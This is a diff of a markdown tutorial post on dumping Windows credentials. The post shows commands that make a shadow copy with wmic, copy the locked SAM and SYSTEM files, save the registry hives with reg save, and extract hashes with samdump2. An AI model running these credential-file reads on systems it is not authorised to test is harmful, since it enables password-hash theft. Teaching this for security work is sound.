@@ -22,7 +22,7 @@ SAM starts running in the background as soon as the Windows boots up.
 located at C:\Windows\System32\config\SAM
 but the SYSTEM process has an exclusive lock on it, preventing us from reading or copying it even from an administrative command prompt
 
- Failure to copy the SAM database
+## Failure to copy the SAM database
 ```
 copy c:\Windows\System32\config\sam C:\Users\nored0x\Downloads\sam
 ```
@@ -34,7 +34,7 @@ There are two potential workarounds.
 Specifically, we’ll launch wmic, specify the shadowcopy class, create a new shadow volume and specify the source drive with “Volume=‘C:\’”. This will create a snapshot of the C drive.
  
  
-Creating a shadow volume
+## Creating a shadow volume
 ```
  wmic shadowcopy call create Volume='C:\'
  ```
@@ -50,17 +50,16 @@ vssadmin list shadows
 
 
 
-Shadow copying the SAM database
+## Shadow copying the SAM database
 ```
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\sam C:\users\nored0x\Downloads\sam
 ```
 
- <img src="/img/cred1/4.PNG" alt="Getting-gz" width="1000" height="200"> 
-
+<img src="/img/cred1/4.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 The encryption keys are stored in the SYSTEM file, which is in the same folder as the SAM database. However, it is also locked by the SYSTEM account
 
-Shadow copying the SYSTEM file
+## Shadow copying the SYSTEM file
 
 ```
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\system C:\users\nored0x\Downloads\system
@@ -68,7 +67,8 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\sys
 
 <img src="/img/cred1/5.PNG" alt="Getting-gz" width="1000" height="200"> 
 
-
+## register
+We can also obtain a copy of the SAM database and SYSTEM files from the registry in the HKLM\sam and HKLM\system hives, respectively. Administrative permissions are required to read and copy
 ```
 reg save HKLM\sam C:\users\nored0x\Downloads\sam
 ```
@@ -78,7 +78,7 @@ reg save HKLM\system C:\users\nored0x\Desktop\system
 ```
 <img src="/img/cred1/7.PNG" alt="Getting-gz" width="1000" height="200"> 
 
-
+## tools
 ## samdump2
 ```
 samdump2 SYSTEM SAM 
